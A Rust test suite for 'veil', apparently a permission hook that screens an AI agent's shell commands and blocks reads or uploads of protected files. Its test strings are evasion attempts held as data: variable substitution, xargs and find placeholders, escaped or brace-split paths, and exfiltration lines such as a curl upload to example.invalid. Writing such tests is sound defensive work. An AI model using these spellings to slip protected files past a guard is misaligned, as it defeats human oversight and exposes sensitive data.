//! bd-2mi: the dynamic-argument stance. A variable the command string assigns
//! is substituted before the path is judged; an argument veil cannot resolve
//! (an unset variable, a `$( )` result, the names `xargs` reads) is blocked for
//! a command that reads or ships files, and for any command that runs where a
//! protected path is in play. These tests drive the real `veil` binary with
//! Claude Code `PreToolUse` payloads against real files and directories.
//!
//! What they do not cover: a command that changes directory and then reads a
//! relative path (bd-vyk), and a script that opens files it was never given
//! (bd-1bk). `find . -exec cat {} \;` in a repo whose protected file is known
//! only to a built-in pack is bd-1si's, reopened with its own failing test.

use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{SystemTime, UNIX_EPOCH};

use serde_json::{Value, json};

static COUNTER: AtomicU64 = AtomicU64::new(0);

const HOLDINGS: &str = "data/clients/holdings.csv";

struct Repo {
    root: PathBuf,
    audit: PathBuf,
}

struct Verdict {
    action: String,
    reason: Option<String>,
}

impl Verdict {
    fn denied(&self) -> bool {
        self.action == "deny"
    }
}

/// A repo whose `data/**` is protected, plus a clean directory, an ordinary
/// note and a `.env` file that only a built-in pack recognises. `policy` is
/// added under `[policy]`.
fn repo(label: &str, policy: &str) -> Repo {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("clock should be after the epoch")
        .as_nanos();
    let counter = COUNTER.fetch_add(1, Ordering::Relaxed);
    let root = std::env::temp_dir().join(format!(
        "veil-dyn-{label}-{}-{nanos}-{counter}",
        std::process::id()
    ));
    fs::create_dir_all(root.join("data/clients")).expect("data dir");
    fs::create_dir_all(root.join("src")).expect("src dir");
    fs::write(root.join(HOLDINGS), "name,ssn\nada,078-05-1120\n").expect("protected file");
    fs::write(root.join("src/main.rs"), "fn main() {}\n").expect("source file");
    fs::write(root.join("notes.md"), "notes\n").expect("note");
    fs::write(root.join(".env"), "TOKEN=abc\n").expect("env file");

    let root = fs::canonicalize(&root).expect("repo root should canonicalize");
    let audit = root.join("state/audit.jsonl");
    let config = |protected: &str| {
        format!(
            "[sensitivity]\nprotected = [\"{protected}\"]\n\n[policy]\naudit_log = true\naudit_path = \"{}\"\n{policy}\n",
            audit.to_string_lossy().replace('\\', "\\\\")
        )
    };
    fs::write(root.join(".veil.toml"), config("data/**")).expect("config should be written");

    // The nearest `.veil.toml` wins, and this path pattern is relative to the
    // nested config file's directory.
    fs::create_dir_all(root.join("vault/local")).expect("nested protected dir");
    fs::write(root.join("vault/local/keys.txt"), "k\n").expect("vault file");
    fs::write(root.join("vault/.veil.toml"), config("local/**")).expect("vault config");

    Repo { root, audit }
}

fn bash(repo: &Repo, command: &str) -> Verdict {
    run(repo, &repo.root, command, &[])
}

fn bash_in(repo: &Repo, directory: &str, command: &str) -> Verdict {
    run(repo, &repo.root.join(directory), command, &[])
}

fn run(repo: &Repo, cwd: &Path, command: &str, env: &[(&str, &str)]) -> Verdict {
    let payload = json!({
        "session_id": "dynamic-args",
        "cwd": cwd,
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": { "command": command },
    });

    let mut child = Command::new(env!("CARGO_BIN_EXE_veil"));
    child
        .current_dir(cwd)
        .env("HOME", &repo.root)
        .env_remove("XDG_CONFIG_HOME")
        .env_remove("XDG_STATE_HOME")
        .env_remove("VEIL_PROTECTED")
        .env_remove("VEIL_SPINE_TOOLS")
        .env_remove("VEIL_POLICY")
        .env_remove("VEIL_DYNAMIC_ARGS")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    for (name, value) in env {
        child.env(name, value);
    }
    let mut child = child.spawn().expect("veil should spawn");
    child
        .stdin
        .take()
        .expect("stdin should be piped")
        .write_all(payload.to_string().as_bytes())
        .expect("payload should be written");
    let output = child.wait_with_output().expect("veil should exit");

    assert_eq!(
        output.status.code(),
        Some(0),
        "veil should exit 0, stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let decision: Value =
        serde_json::from_slice(&output.stdout).expect("veil should print a JSON decision");
    let specific = &decision["hookSpecificOutput"];

    Verdict {
        action: specific["permissionDecision"]
            .as_str()
            .expect("decision should carry permissionDecision")
            .to_owned(),
        reason: specific["permissionDecisionReason"]
            .as_str()
            .map(str::to_owned),
    }
}

fn audit_records(repo: &Repo) -> Vec<Value> {
    fs::read_to_string(&repo.audit)
        .map(|text| {
            text.lines()
                .map(|line| serde_json::from_str(line).expect("audit line should parse"))
                .collect()
        })
        .unwrap_or_default()
}

fn reason_classes(repo: &Repo) -> Vec<String> {
    audit_records(repo)
        .iter()
        .map(|record| record["reason_class"].as_str().unwrap_or("").to_owned())
        .collect()
}

fn assert_denied(repo: &Repo, command: &str) -> String {
    let verdict = bash(repo, command);
    assert!(
        verdict.denied(),
        "should be denied: {command} (got {})",
        verdict.action
    );
    verdict.reason.expect("a denial carries its reason")
}

fn assert_allowed(repo: &Repo, command: &str) {
    let verdict = bash(repo, command);
    assert!(
        !verdict.denied(),
        "should be allowed: {command} (reason: {:?})",
        verdict.reason
    );
}

#[test]
fn project_config_is_found_when_the_hook_runs_from_a_subdirectory() {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("clock should be after the epoch")
        .as_nanos();
    let counter = COUNTER.fetch_add(1, Ordering::Relaxed);
    let root = std::env::temp_dir().join(format!(
        "veil-dyn-subdir-config-{}-{nanos}-{counter}",
        std::process::id()
    ));
    fs::create_dir_all(root.join("vault")).expect("vault dir");
    fs::create_dir_all(root.join("data")).expect("data dir");
    fs::create_dir_all(root.join("data/vault")).expect("nested unprotected vault dir");
    fs::write(root.join("vault/secret.txt"), "secret\n").expect("protected file");
    fs::write(root.join("data/vault/note.txt"), "ordinary\n").expect("unprotected file");
    fs::write(
        root.join(".veil.toml"),
        "[sensitivity]\nprotected = [\"vault/**\"]\n",
    )
    .expect("project config");
    let root = fs::canonicalize(root).expect("project root should canonicalize");
    let repo = Repo {
        audit: root.join("state/audit.jsonl"),
        root: root.clone(),
    };

    assert!(bash(&repo, "cat vault/secret.txt").denied());
    assert!(bash_in(&repo, "data", "cat ../vault/secret.txt").denied());
    assert!(
        bash_in(
            &repo,
            "data",
            &format!("cat {}", root.join("vault/secret.txt").display())
        )
        .denied()
    );
    assert!(!bash(&repo, "cat data/vault/note.txt").denied());
}

#[test]
fn the_nearest_project_config_replaces_the_outer_project_config() {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("clock should be after the epoch")
        .as_nanos();
    let counter = COUNTER.fetch_add(1, Ordering::Relaxed);
    let root = std::env::temp_dir().join(format!(
        "veil-dyn-nested-config-{}-{nanos}-{counter}",
        std::process::id()
    ));
    fs::create_dir_all(root.join("vault")).expect("outer protected dir");
    fs::create_dir_all(root.join("child/local")).expect("nested protected dir");
    fs::write(root.join("vault/outer.txt"), "outer\n").expect("outer protected file");
    fs::write(root.join("child/local/inner.txt"), "inner\n").expect("nested protected file");
    fs::write(
        root.join(".veil.toml"),
        "[sensitivity]\nprotected = [\"vault/**\"]\n",
    )
    .expect("outer project config");
    fs::write(
        root.join("child/.veil.toml"),
        "[sensitivity]\nprotected = [\"local/**\"]\n",
    )
    .expect("nested project config");
    let root = fs::canonicalize(root).expect("project root should canonicalize");
    let repo = Repo {
        audit: root.join("state/audit.jsonl"),
        root,
    };

    assert!(bash_in(&repo, "child", "cat local/inner.txt").denied());
    assert!(!bash_in(&repo, "child", "cat ../vault/outer.txt").denied());
}

#[test]
fn an_assigned_variable_is_substituted_before_the_path_is_judged() {
    let repo = repo("assigned", "");

    for command in [
        "f=data/clients/holdings.csv; cat $f",
        "f=data/clients/holdings.csv && cat \"$f\"",
        "f='data/clients/holdings.csv'\ncat ${f}",
        "export f=data/clients/holdings.csv; cat $f",
        "declare -x f=data/clients/holdings.csv; cat $f",
        "d=data/clients; cat $d/holdings.csv",
        "a=data; b=clients; cat $a/$b/holdings.csv",
        "f=data/clients/holdings.csv; g=$f; cat $g",
        "f=$'data/clients/holdings.csv'; cat $f",
        "f=.env; cat $f",
        // not only the readers veil knows: any command that is given the path
        "f=data/clients/holdings.csv; awk 1 $f",
        "f=data/clients/holdings.csv; cp $f /srv/out.csv",
        "f=data/clients/holdings.csv; python3 -c 'print(1)' $f",
    ] {
        let reason = assert_denied(&repo, command);
        assert!(
            !reason.contains("cannot resolve"),
            "a path veil can work out is judged as a path, not as unresolved: {command}: {reason}"
        );
    }

    for command in [
        "f=src/main.rs; cat $f",
        "d=src; cat $d/main.rs",
        "f=notes.md && head -n 1 \"$f\"",
        "a=src; b=main.rs; awk 1 $a/$b",
        // a value with a space is two words only when it is not quoted
        "f='my notes.md'; cat \"$f\"",
    ] {
        assert_allowed(&repo, command);
    }

    // the audit record says the path was judged by what the command reads
    let records = audit_records(&repo);
    assert!(
        records
            .iter()
            .any(|record| record["reason_class"] == "direct_read"
                && record["path"]
                    .as_str()
                    .is_some_and(|path| path.ends_with(HOLDINGS))),
        "{records:?}"
    );
}

#[test]
fn a_name_that_is_assigned_more_than_once_is_not_trusted() {
    let repo = repo("reassigned", "");

    // Either order: a branch or a loop may have run either assignment.
    for command in [
        "f=notes.md; f=data/clients/holdings.csv; cat $f",
        "f=data/clients/holdings.csv; f=notes.md; cat $f",
        "f=notes.md; f+=x; cat $f",
        "read f; cat $f",
        "for f in $(ls); do cat $f; done",
        "while read f; do cat $f; done < notes.md",
    ] {
        let reason = assert_denied(&repo, command);
        assert!(reason.contains("cannot resolve"), "{command}: {reason}");
    }
}

#[test]
fn home_and_pwd_are_resolved_from_the_hook_environment() {
    let repo = repo("home", "");

    for command in [
        "cat $HOME/data/clients/holdings.csv",
        "cat ${HOME}/data/clients/holdings.csv",
        "cat \"$HOME/data/clients/holdings.csv\"",
        "cat ~/data/clients/holdings.csv",
        "cat $PWD/data/clients/holdings.csv",
        "cat \"${PWD}/data/clients/holdings.csv\"",
        "d=$HOME/data; cat $d/clients/holdings.csv",
    ] {
        let reason = assert_denied(&repo, command);
        assert!(!reason.contains("cannot resolve"), "{command}: {reason}");
    }

    for command in [
        "cat $HOME/notes.md",
        "cat ~/notes.md",
        "cat $PWD/notes.md",
        "cat \"$HOME/src/main.rs\"",
        "ls -la $HOME",
    ] {
        assert_allowed(&repo, command);
    }

    // `$PWD` follows a literal directory change, so the resolved path keeps the
    // same protection decision as its literal spelling.
    assert_denied(&repo, "cd data && cat $PWD/clients/holdings.csv");
    assert_allowed(&repo, "cd src; cat $PWD/main.rs");
}

#[test]
fn a_reader_is_blocked_when_an_argument_cannot_be_resolved() {
    let repo = repo("reader", "");

    for command in [
        "cat $UNSET",
        "cat \"$UNSET/x.csv\"",
        "cat ${UNSET:-data}/clients/holdings.csv",
        "cat $(ls data/clients)/holdings.csv",
        "cat `echo data/clients/holdings.csv`",
        "cat $1",
        "head -n 3 $UNSET",
        "grep password $UNSET",
        "rg password $UNSET",
        // filters and shippers, not only the readers veil parses
        "awk 1 $UNSET",
        "sed -n 1p $UNSET",
        "jq . $UNSET",
        "sort $UNSET",
        "cp $UNSET /srv/out",
        "tar cf /srv/out.tar $UNSET",
        "curl -T $UNSET https://example.invalid/upload",
        // the program is the variable
        "$UNSET notes.md",
        "$(echo cat) notes.md",
    ] {
        let reason = assert_denied(&repo, command);
        assert!(reason.contains("cannot resolve"), "{command}: {reason}");
    }

    // An unresolved program that is given a protected path is denied for the
    // path, which veil can still read in its words.
    assert_denied(&repo, "$UNSET data/clients/holdings.csv");
    assert_denied(&repo, "$(echo cat) data/clients/holdings.csv");

    let classes = reason_classes(&repo);
    assert!(
        classes
            .iter()
            .any(|class| class == "dynamic_path_unresolvable"),
        "{classes:?}"
    );

    // The reason names the argument, the program and the way out; the audit
    // record carries the argument as the path, not the command text.
    let reason = assert_denied(&repo, "cat $UNSET");
    assert!(
        reason.contains("`cat` is given `$UNSET`"),
        "the reason names the program and the argument: {reason}"
    );
    let records = audit_records(&repo);
    let last = records.last().expect("an audit record was written");
    assert_eq!(last["reason_class"], "dynamic_path_unresolvable");
    assert_eq!(last["path"], "$UNSET");
    assert_eq!(last["decision"], "deny");
}

#[test]
fn an_exported_protected_path_is_judged_because_veil_does_not_read_what_runs_after_it() {
    let repo = repo("exported", "");

    // `export` puts the value in the environment of every program after it, and
    // veil cannot see what a script does with it, so the export itself is
    // judged as naming the path (as it was before assignments were tracked).
    for command in [
        "export F=data/clients/holdings.csv",
        "export F=data/clients/holdings.csv; ./run.sh",
        "export OTHER=1 F=data/clients/holdings.csv; node script.js",
        "declare -x F=data/clients/holdings.csv; ./run.sh",
        "typeset -x F=data/clients/holdings.csv; ./run.sh",
        "d=data/clients; export F=$d/holdings.csv; ./run.sh",
        "export F=.env; ./run.sh",
    ] {
        assert_denied(&repo, command);
    }

    // A value that is no protected path, and a variable that is only the
    // shell's own, hand nothing to anything.
    for command in [
        "export F=notes.md; ./run.sh",
        "export MODE=fast OTHER=1; ./run.sh",
        "F=data/clients/holdings.csv; echo done",
        "declare F=data/clients/holdings.csv; echo done",
        "local F=data/clients/holdings.csv; echo done",
    ] {
        assert_allowed(&repo, command);
    }
}

#[test]
fn a_loop_over_known_words_is_judged_for_every_word() {
    let repo = repo("loops", "");

    for command in [
        "for f in data/clients/holdings.csv notes.md; do cat $f; done",
        "for f in notes.md data/clients/holdings.csv; do cat \"$f\"; done",
        "for f in notes.md data/clients/holdings.csv\ndo\n  head -n 1 \"$f\"\ndone",
        "for f in data/clients/holdings.csv; do awk 1 ${f}; done",
        "for f in data/clients/holdings.csv; do cp $f /srv/out.csv; done",
        "for d in data src; do for f in clients; do cat $d/$f/holdings.csv; done; done",
        "for f in data/{clients,other}/holdings.csv; do cat $f; done",
        "for f in .env notes.md; do cat $f; done",
        // a glob that starts in a protected directory is judged as ever
        "for f in data/clients/*.csv; do cat $f; done",
        "for f in data/*; do wc -c $f; cat $f; done",
    ] {
        let reason = assert_denied(&repo, command);
        assert!(!reason.contains("cannot resolve"), "{command}: {reason}");
    }

    for command in [
        "for f in notes.md src/main.rs; do cat $f; done",
        "for f in notes.md src/main.rs; do head -n 1 \"$f\"; done",
        "for f in src/*.rs; do wc -l $f; done",
        "for a in x y; do for b in 1 2; do echo $a$b; done; done",
        "for f in a b c; do echo \"$f\"; done",
    ] {
        assert_allowed(&repo, command);
    }

    // A list veil cannot see, or a name that something else sets too, is not
    // guessed at.
    for command in [
        "for f in $(ls data/clients); do cat $f; done",
        "for f in $(git ls-files); do cat $f; done",
        "for f in $LIST; do cat $f; done",
        "for f in notes.md; do f=data/clients/holdings.csv; cat $f; done",
        "for f in notes.md; do read f; cat $f; done",
        "for a in {1..10}; do for b in {1..10}; do cat $a$b; done; done",
    ] {
        let reason = assert_denied(&repo, command);
        assert!(reason.contains("cannot resolve"), "{command}: {reason}");
    }
}

#[test]
fn a_reader_is_judged_only_for_the_files_it_opens() {
    let repo = repo("positions", "");

    // An unresolved word in a place the reader takes a file stays blocked,
    // however the reader is spelled.
    for command in [
        "cat -- $U",
        "cat -n $U",
        "cat a.txt $U",
        "cat < $U",
        "head -n3 $U",
        "head -3 $U",
        "head -n 3 $U",
        "tail -f $U",
        "tail -n +2 $U",
        "less $U",
        "bat $U",
        "grep -e foo -- $U",
        "grep -rn pat $U",
        "grep -A 3 pat $U",
        "grep pat -- $U",
        "grep pat $U other.txt",
        "grep -r \"$p\" \"$d\"",
        "rg -g '*.rs' pat $U",
        "cat $(ls)",
        "cat \"$(ls)/x\"",
        "ls | xargs grep foo",
    ] {
        let reason = assert_denied(&repo, command);
        assert!(reason.contains("cannot resolve"), "{command}: {reason}");
    }

    // A pattern, a count or a glob is no file, so it is not a path veil could
    // not resolve.
    for command in [
        "grep \"$p\" notes.md",
        "grep -e \"$p\" notes.md",
        "grep -i -- \"$p\" notes.md",
        "grep -A $n x notes.md",
        "head -n $n notes.md",
        "head -c $n notes.md",
        "tail -n \"$n\" notes.md",
        "rg \"$pat\" src",
        "rg -g \"$glob\" pat src",
        "n=$(wc -l < notes.md); head -n $n notes.md",
    ] {
        assert_allowed(&repo, command);
    }

    // The files it does open are still judged.
    assert_denied(&repo, "grep \"$p\" data/clients/holdings.csv");
    assert_denied(&repo, "head -n $n data/clients/holdings.csv");
    assert_denied(&repo, "p=x; grep -rn \"$p\" data");
}

#[test]
fn a_command_that_neither_reads_nor_ships_files_is_not_blocked_outside_a_protected_context() {
    let repo = repo("others", "");

    for command in [
        "echo $UNSET",
        "echo \"done: $RESULT\"",
        "ls $UNSET",
        "ls -la $UNSET/",
        "wc -l $UNSET",
        "mkdir -p $UNSET/out",
        "git push origin $BRANCH",
        "git commit -m \"$MESSAGE\"",
        "cargo test $FILTER",
        "npm run $SCRIPT",
        "python3 $SCRIPT",
        "make $TARGET",
        "cat notes.md; echo $?",
        "echo $$ $! $#",
        // process substitution is a pipe, and the commands inside are judged
        "diff <(sort notes.md) <(sort src/main.rs)",
        // globs are judged by where they start, not as unresolved
        "cat src/*.rs",
        "cat notes.m?",
        "echo {a,b,c}",
        "echo {1..30}",
    ] {
        assert_allowed(&repo, command);
    }

    let reason = assert_denied(&repo, "diff <(cat data/clients/holdings.csv) notes.md");
    assert!(reason.contains("direct read of a path"), "{reason}");
}

#[test]
fn any_command_is_blocked_where_a_protected_path_is_in_play() {
    let repo = repo("context", "");

    // Run from inside the protected directory.
    for command in [
        "echo $UNSET",
        "ls $UNSET",
        "wc -l $UNSET",
        "python3 $SCRIPT",
    ] {
        assert_allowed(&repo, command);
        let verdict = bash_in(&repo, "vault/local", command);
        assert!(verdict.denied(), "inside vault: {command}");
        let reason = verdict.reason.expect("a denial carries its reason");
        assert!(reason.contains("inside a protected directory"), "{reason}");
    }
    assert!(!bash_in(&repo, "src", "echo $UNSET").denied());
    // arguments that resolve are not unresolved there
    assert!(!bash_in(&repo, "vault/local", "ls .").denied());

    // A string that sets a variable to a protected path, literal or from a pack.
    for command in [
        "d=data/clients; ls $UNSET",
        "f=data/clients/holdings.csv; echo $UNSET",
        "f=.env; wc -l $UNSET",
        "f=$HOME/data; echo $UNSET",
    ] {
        let reason = assert_denied(&repo, command);
        assert!(
            reason.contains("sets a variable to a protected path"),
            "{command}: {reason}"
        );
    }
    for command in [
        "d=src; ls $UNSET",
        "f=notes.md; echo $UNSET",
        "n=3; echo $UNSET $n",
    ] {
        assert_allowed(&repo, command);
    }

    // The same arguments are allowed when they resolve.
    assert_allowed(&repo, "f=notes.md; ls $f");
}

#[test]
fn xargs_and_find_placeholders_are_unresolved_arguments() {
    let repo = repo("placeholders", "");

    for command in [
        "ls -a | xargs cat",
        "ls | xargs -I{} cat {}",
        "ls | xargs -n1 head",
        "find . -name '*.csv' | xargs awk 1",
        "git ls-files | xargs cp -t /srv",
        "echo data/clients/holdings.csv | xargs cat",
        "find $UNSET -exec cat {} \\;",
        "find src -print0 | xargs -0 cat",
    ] {
        let reason = assert_denied(&repo, command);
        assert!(reason.contains("cannot resolve"), "{command}: {reason}");
    }

    // A command that only counts or lists is not given file contents.
    for command in [
        "git ls-files | xargs wc -l",
        "ls | xargs ls -l",
        "echo a b | xargs echo",
        "find src -name '*.rs' -exec cat {} \\;",
        "find src -name '*.rs' -exec wc -l {} +",
    ] {
        assert_allowed(&repo, command);
    }

    // A literal root that holds protected paths is still judged as a directory.
    assert_denied(&repo, "find data -exec cat {} \\;");
}

#[test]
fn quoting_and_expansion_do_not_hide_a_path() {
    let repo = repo("quoting", "");

    for command in [
        "cat $'data/clients/holdings.csv'",
        "cat $'data/clients/hold\\x69ngs.csv'",
        "cat $'\\144ata/clients/holdings.csv'",
        "cat $\"data/clients/holdings.csv\"",
        "cat data/clients/h{oldings,x}.csv",
        "cat data/{other,clients}/holdings.csv",
        "cat data/cl{,}ients/holdings.csv",
        "cat data/clients/holdings.cs{v,}",
        "cat da\"\"ta/cli'e'nts/holdings.csv",
        "cat da\\ta/clients/holdings.csv",
        "cat $'.env'",
        "cat .e\\nv",
    ] {
        let reason = assert_denied(&repo, command);
        assert!(
            !reason.contains("cannot resolve"),
            "a path veil can work out is judged as a path: {command}: {reason}"
        );
    }

    for command in [
        "cat notes.m{d,}",
        "cat $'notes.md'",
        "cat $'no\\x74es.md'",
        "echo $'\\x41' | cat",
    ] {
        assert_allowed(&repo, command);
    }

    // A brace list too long to expand is not guessed at.
    let reason = assert_denied(&repo, "cat file{1..100}.csv");
    assert!(reason.contains("cannot resolve"), "{reason}");
    assert_allowed(&repo, "echo file{1..100}.csv");

    // ANSI-C text that is not text is not guessed at either.
    let reason = assert_denied(&repo, "cat $'\\xff'");
    assert!(reason.contains("cannot resolve"), "{reason}");
}

#[test]
fn text_veil_cannot_analyse_is_blocked() {
    let repo = repo("opaque", "");

    // A shell runs the commands before the unbalanced quote.
    for command in [
        "cat notes.md\necho \"unterminated",
        "cat 'unterminated",
        "echo $(cat notes.md",
        "echo $'unterminated",
    ] {
        let reason = assert_denied(&repo, command);
        assert!(reason.contains("cannot analyse"), "{command}: {reason}");
    }

    // More commands than veil follows: the ones past the cap cannot be seen.
    let padded = |count: usize, last: &str| {
        let mut commands = vec!["echo ok".to_owned(); count];
        commands.push(last.to_owned());
        commands.join("; ")
    };
    let reason = assert_denied(&repo, &padded(70, "cat data/clients/holdings.csv"));
    assert!(reason.contains("cannot analyse"), "{reason}");
    assert_allowed(&repo, &padded(10, "cat notes.md"));
    assert_denied(&repo, &padded(10, "cat data/clients/holdings.csv"));

    let classes = reason_classes(&repo);
    assert!(
        classes
            .iter()
            .any(|class| class == "dynamic_path_unresolvable"),
        "{classes:?}"
    );
}

#[test]
fn dynamic_args_warn_allows_and_records_what_deny_would_block() {
    let repo = repo("warn", "dynamic_args = \"warn\"\n");

    let verdict = bash(&repo, "cat $UNSET");
    assert!(!verdict.denied(), "{:?}", verdict.reason);

    let records = audit_records(&repo);
    let record = records.last().expect("the allow is recorded");
    assert_eq!(record["decision"], "allow");
    assert_eq!(record["reason_class"], "dynamic_path_unresolvable");
    assert_eq!(record["path"], "$UNSET");
    assert!(
        record["reason"]
            .as_str()
            .is_some_and(|reason| reason.starts_with("[policy] dynamic_args = warn:")),
        "{record}"
    );

    // Warn is only about arguments veil cannot resolve: a path it can work
    // out is denied as before.
    assert!(bash(&repo, "f=data/clients/holdings.csv; cat $f").denied());
    assert!(bash(&repo, "cat data/clients/holdings.csv").denied());
}

#[test]
fn dynamic_args_allow_does_not_judge_unresolved_arguments_and_leaves_paths_alone() {
    let repo = repo("allow", "dynamic_args = \"allow\"\n");

    for command in [
        "cat $UNSET",
        "ls -a | xargs cat",
        "cat 'unterminated",
        "$UNSET notes.md",
    ] {
        assert_allowed(&repo, command);
    }
    assert!(
        reason_classes(&repo)
            .iter()
            .all(|class| class != "dynamic_path_unresolvable"),
        "allow records nothing for them"
    );

    assert_denied(&repo, "f=data/clients/holdings.csv; cat $f");
    assert_denied(&repo, "cat data/clients/holdings.csv");
    assert_denied(&repo, "cat $'data/clients/holdings.csv'");
    // a path veil can still read in the words of a command with an unresolved
    // program is judged as a path, in every mode
    assert_denied(&repo, "$UNSET data/clients/holdings.csv");
}

#[test]
fn the_environment_overrides_the_project_and_the_global_default_still_downgrades() {
    // project says deny, the environment says allow
    let repo_env = repo("env", "dynamic_args = \"deny\"\n");
    let verdict = run(
        &repo_env,
        &repo_env.root,
        "cat $UNSET",
        &[("VEIL_DYNAMIC_ARGS", "allow")],
    );
    assert!(!verdict.denied());
    let verdict = run(
        &repo_env,
        &repo_env.root,
        "cat $UNSET",
        &[("VEIL_DYNAMIC_ARGS", "deny")],
    );
    assert!(verdict.denied());

    // a value veil does not know is refused loudly, not ignored
    let mut child = Command::new(env!("CARGO_BIN_EXE_veil"))
        .env("HOME", &repo_env.root)
        .env("VEIL_DYNAMIC_ARGS", "log")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("veil should spawn");
    child
        .stdin
        .take()
        .expect("stdin should be piped")
        .write_all(
            json!({
                "session_id": "dynamic-args",
                "cwd": repo_env.root,
                "hook_event_name": "PreToolUse",
                "tool_name": "Bash",
                "tool_input": { "command": "cat $UNSET" },
            })
            .to_string()
            .as_bytes(),
        )
        .expect("payload should be written");
    let output = child.wait_with_output().expect("veil should exit");
    assert!(
        String::from_utf8_lossy(&output.stderr).contains("VEIL_DYNAMIC_ARGS"),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    // `[policy] default = "warn"` downgrades the block to an allow that is
    // recorded, as it does for every other block.
    let repo_warn = repo("global-warn", "default = \"warn\"\n");
    let verdict = bash(&repo_warn, "cat $UNSET");
    assert!(!verdict.denied());
    let records = audit_records(&repo_warn);
    let record = records.last().expect("the allow is recorded");
    assert_eq!(record["reason_class"], "dynamic_path_unresolvable");
    assert!(
        record["reason"]
            .as_str()
            .is_some_and(|reason| reason.starts_with("policy default warn:")),
        "{record}"
    );
}
